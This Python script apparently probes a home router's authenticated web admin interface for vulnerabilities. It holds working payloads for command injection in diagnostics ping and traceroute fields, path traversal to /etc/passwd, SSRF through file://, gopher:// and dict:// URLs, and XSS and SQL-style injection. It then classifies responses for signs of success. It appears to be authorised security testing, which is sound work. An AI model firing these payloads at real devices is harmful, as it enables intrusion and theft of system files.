#!/usr/bin/env python3
"""Paced authenticated software attack surface pass — injection, SSRF, hidden actions.

Uses normal admin SRP. Skips factory reset, reboot, semi-reset, system_bootp, and
real firmware upload. May send benign-invalid import, table rows that fail validation,
and diagnostics host probes. Bodies go to a private ignored directory; stdout is metadata.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import time
import urllib.error
import urllib.parse
from pathlib import Path

from f1_pacing import DEFAULT_REQUEST_GAP_S, wait_until_login_ready
from f1_srp_login import SRPClient

ROOT = Path(__file__).resolve().parents[1]
BASE = "http://192.168.2.1"
GAP = DEFAULT_REQUEST_GAP_S
DASHBOARD_SHA_PREFIX = None  # filled at runtime


def login_marker(body: bytes) -> bool:
    return bool(re.search(rb'id\s*=\s*[\"\']sign-me-in[\"\']', body, re.I))


def csrf_from(html: bytes) -> str:
    m = re.search(rb'CSRFtoken"\s+content\s*=\s*"([^"]+)"', html, re.I)
    if not m:
        raise RuntimeError("CSRF meta not found")
    return m.group(1).decode()


def classify(body: bytes, code: int) -> dict:
    text = body.decode("utf-8", "replace")
    markers = []
    for name, pat in (
        ("thenc", b"PREAMBLE=THENC"),
        ("proc_rip", b"/proc/rip"),
        ("passwd", b"root:"),
        ("uid", b"uid="),
        ("lua_trace", b".lua:"),
        ("stack", b"stack traceback"),
        ("cmd_output", b"Linux version"),
        ("wrong_key", b"wrong key"),
        ("valid_ipv4", b"valid IPv4"),
        ("valid_host", b"valid ipv4/domain"),
        ("export_log", b"syslog"),
        ("json_success", b'"success"'),
    ):
        if pat in body:
            markers.append(name)
    json_keys: list[str] = []
    try:
        parsed = json.loads(body)
        if isinstance(parsed, dict):
            json_keys = sorted(parsed.keys())[:12]
    except (ValueError, UnicodeDecodeError):
        pass
    sha = hashlib.sha256(body).hexdigest()
    interesting = False
    if login_marker(body):
        pass
    elif sha.startswith(DASHBOARD_SHA_PREFIX or ""):
        pass
    elif markers:
        interesting = any(
            m in markers
            for m in (
                "thenc",
                "proc_rip",
                "passwd",
                "uid",
                "lua_trace",
                "stack",
                "wrong_key",
            )
        )
    elif json_keys and code == 200:
        interesting = True
    elif code >= 500:
        interesting = True
    elif len(body) not in (0, 17267, 5784) and not login_marker(body):
        interesting = len(body) < 8000
    return {
        "markers": markers,
        "json_keys": json_keys,
        "interesting": interesting,
        "sha256": sha,
    }


class Client(SRPClient):
    def __init__(self, directory: Path) -> None:
        super().__init__(str(directory / "cookies.txt"), BASE)
        self.directory = directory
        self.index = 0
        self.rows: list[dict] = []

    def req(
        self,
        label: str,
        path: str,
        method: str = "GET",
        data: bytes | None = None,
    ) -> tuple[int, bytes]:
        if self.index:
            time.sleep(GAP)
        self.index += 1
        url = BASE + path if path.startswith("/") else BASE + "/" + path
        try:
            code, body = self._open(url, data, method)
        except urllib.error.HTTPError as err:
            code, body = err.code, err.read()
        info = classify(body, code)
        row = {
            "n": self.index,
            "label": label,
            "method": method,
            "path": path.split("?")[0],
            "query": urllib.parse.urlsplit(path).query or None,
            "status": code,
            "bytes": len(body),
            **info,
        }
        self.rows.append(row)
        (self.directory / f"body-{self.index:03d}.private").write_bytes(body)
        (self.directory / "summary.json").write_text(
            json.dumps(self.rows, indent=2) + "\n"
        )
        print(json.dumps({k: row[k] for k in ("n", "label", "status", "bytes", "interesting", "markers", "json_keys")}), flush=True)
        if code == 503:
            raise SystemExit("http_503_stop")
        return code, body


def session_admin(client: Client, password: str) -> None:
    code, body = client.req("login_page", "/login.lp")
    if code != 200:
        raise SystemExit("login_page_failed")
    client.csrf = csrf_from(body)
    code, result = client.login("User", password)
    if code != 200 or result != "ok":
        raise SystemExit("srp_failed")
    code, body = client.req("gateway", "/gateway.lp")
    if code != 200 or login_marker(body):
        raise SystemExit("gateway_not_admin")
    global DASHBOARD_SHA_PREFIX
    DASHBOARD_SHA_PREFIX = hashlib.sha256(body).hexdigest()[:16]
    client.csrf = csrf_from(body)
    code, body = client.req("session_poll", "/gateway.lp?auto_update=true&getSessionStatus=true")
    try:
        role = json.loads(body).get("current_role")
    except (ValueError, AttributeError):
        role = None
    if role != "admin":
        raise SystemExit("not_admin")


def post_form(client: Client, label: str, path: str, fields: list[tuple[str, str]]) -> tuple[int, bytes]:
    data = urllib.parse.urlencode(fields).encode()
    return client.req(label, path, "POST", data)


def build_cases(csrf: str) -> list[tuple[str, str, str, list[tuple[str, str]] | None]]:
    """label, path, method, post fields or None for GET."""
    enc = urllib.parse.quote
    cases: list[tuple[str, str, str, list[tuple[str, str]] | None]] = []

    # --- GET JSON / lua / logviewer ---
    for path in (
        "/ajax/wirelesscard.lua?auto_update=true",
        "/ajax/wirelesscard.lua",
        "/ajax/rip.lua",
        "/ajax/debug.lua",
        "/modals/system-config-modal.lp?action=upgradefwstatus",
        "/modals/system-config-modal.lp?action=getbanksize",
        "/gateway.lp?action=scheduleReboot",
        "/modals/parental-modal.lp?action=smartwifi",
        "/modals/logviewer-modal.lp?process=restricted_shell",
        "/modals/logviewer-modal.lp?process=../../../etc/passwd",
        "/modals/wireless-qrcode-modal.lp",
        "/modals/wireless-qrcode-modal.lp?iface=cred0",
        "/modals/wireless-qrcode-modal.lp?iface=cred0&ssid=test%22%3E%3Csvg%2Fonload%3D1%3E",
        "/modals/wireless-ap-modal-newEM.lp?action=modeChange&compatibilityMode=WPA2%26ssid%3Dx",
        "/modals/wireless-ap-modal-newEM.lp?action=split_ssid&splitssid=1&main_ssid=a%26b=1",
    ):
        cases.append((path.split("?")[0].split("/")[-1][:24], path, "GET", None))

    # --- gateway URL SSRF ---
    for url_val in (
        "http://127.0.0.1:631/",
        "http://127.0.0.1:49152/",
        "file:///proc/rip/0108",
        "file:///etc/passwd",
        "gopher://127.0.0.1:631/_",
        "http://192.168.2.1:631/admin",
        "dict://127.0.0.1:631/",
    ):
        cases.append(
            (
                "url_" + url_val.split("://")[0],
                "/gateway.lp",
                "POST",
                [("action", "URL"), ("urlVal", url_val), ("CSRFtoken", csrf)],
            )
        )

    # --- diagnostics injection ---
    ping_hosts = (
        "127.0.0.1",
        "127.0.0.1\nlogger genesis-aggr",
        "`id`",
        "127.0.0.1;id",
        "$(id)",
        "127.0.0.1|id",
    )
    for host in ping_hosts:
        cases.append(
            (
                "ping_" + str(len(cases)),
                "/modals/diagnostics-ping-modal.lp",
                "POST",
                [
                    ("action", "PING"),
                    ("CSRFtoken", csrf),
                    ("ProtocolVersion", "IPv4"),
                    ("ipAddress", host),
                ],
            )
        )
    for host in ("127.0.0.1\nlogger genesis-aggr-trace", "127.0.0.1`id`"):
        cases.append(
            (
                "trace_" + str(len(cases)),
                "/modals/diagnostics-ping-modal.lp",
                "POST",
                [
                    ("action", "TRACE"),
                    ("CSRFtoken", csrf),
                    ("ipAddressTrace", host),
                ],
            )
        )

    # --- device modal DOM sink probe ---
    cases.append(
        (
            "device_edit_xss",
            "/modals/device-modal.lp",
            "POST",
            [
                ("action", "EDIT"),
                ("CSRFtoken", csrf),
                ("macAddress", "00:11:22:33:44:55"),
                ("edit_values", "<img src=x onerror=genesis()>"),
                ("icon", "1"),
            ],
        )
    )

    # --- log export (read) ---
    cases.append(
        (
            "export_log",
            "/modals/logviewer-modal.lp",
            "POST",
            [("action", "export_log"), ("CSRFtoken", csrf)],
        )
    )

    # schedulerebootset: oracle already closed (sentinel rebootTime, no log marker).
    # Do not re-send. See findings/f1-gap-attack-pass-2026-10-12.md.

    # --- invalid import (no real config) ---
    cases.append(
        (
            "import_config_invalid",
            "/modals/system-config-modal.lp",
            "POST",
            [
                ("action", "import_config"),
                ("CSRFtoken", csrf),
                ("import_file", "PREAMBLE=THENC\nNOTREAL=1\n"),
            ],
        )
    )

    # --- WAN table XSS / validation only ---
    cases.append(
        (
            "pf_invalid_dest",
            "/modals/wanservices-modal.lp",
            "POST",
            [
                ("action", "TABLE-ADD"),
                ("CSRFtoken", csrf),
                ("tableid", "portforwarding"),
                ("destinationip", "<script>"),
                ("sourceip", ""),
                ("wanport", "1"),
                ("lanport", "1"),
                ("protocol", "TCP"),
                ("enabled", "1"),
            ],
        )
    )

    # --- internet AJAX-GET ---
    cases.append(
        (
            "internet_ajax",
            "/modals/internet-modal.lp?auto_update=true",
            "POST",
            [
                ("action", "AJAX-GET"),
                ("CSRFtoken", csrf),
                ("auto_update", "true"),
                ("requested_params", "wan_ip"),
                ("requested_params", "wan_ip';DROP--"),
            ],
        )
    )

    # --- POST upgradefwstatus (no file) ---
    cases.append(
        (
            "upgradefwstatus_post",
            "/modals/system-config-modal.lp",
            "POST",
            [("action", "upgradefwstatus"), ("CSRFtoken", csrf)],
        )
    )

    return cases


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--password-file", type=Path, required=True)
    parser.add_argument(
        "--wait-for-login",
        action=argparse.BooleanOptionalAction,
        default=True,
        help="poll /login.lp sparingly until HTTP 200 before any authenticated traffic",
    )
    parser.add_argument("--max-wait", type=float, default=1200.0)
    parser.add_argument("--login-interval", type=float, default=90.0)
    parser.add_argument("--post-ready-pause", type=float, default=45.0)
    args = parser.parse_args()
    if args.wait_for_login:
        outcome = wait_until_login_ready(
            max_wait_s=args.max_wait,
            interval_s=args.login_interval,
            post_ready_pause_s=args.post_ready_pause,
        )
        if not outcome["ready"]:
            raise SystemExit("login_not_ready")
    password = args.password_file.read_text().strip("\n")
    os.umask(0o077)
    out_dir = ROOT / "artifacts" / "management" / time.strftime(
        "aggressive-%Y%m%dT%H%M%SZ", time.gmtime()
    )
    out_dir.mkdir(parents=True, exist_ok=False)
    client = Client(out_dir)
    session_admin(client, password)
    del password
    cases = build_cases(client.csrf)
    interesting = []
    for label, path, method, fields in cases:
        if method == "GET":
            code, body = client.req(label, path, "GET", None)
        else:
            code, body = post_form(client, label, path, fields or [])
        row = client.rows[-1]
        if row.get("interesting"):
            interesting.append(row)
        if login_marker(body):
            raise SystemExit("session_lost")

    meta = {
        "out_dir": str(out_dir),
        "total": len(client.rows),
        "interesting_count": len(interesting),
        "interesting": [
            {k: r[k] for k in ("n", "label", "status", "bytes", "markers", "sha256")}
            for r in interesting
        ],
    }
    (out_dir / "interesting.json").write_text(json.dumps(meta, indent=2) + "\n")
    print(json.dumps({"done": True, "interesting_count": len(interesting), "out_dir": str(out_dir)}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
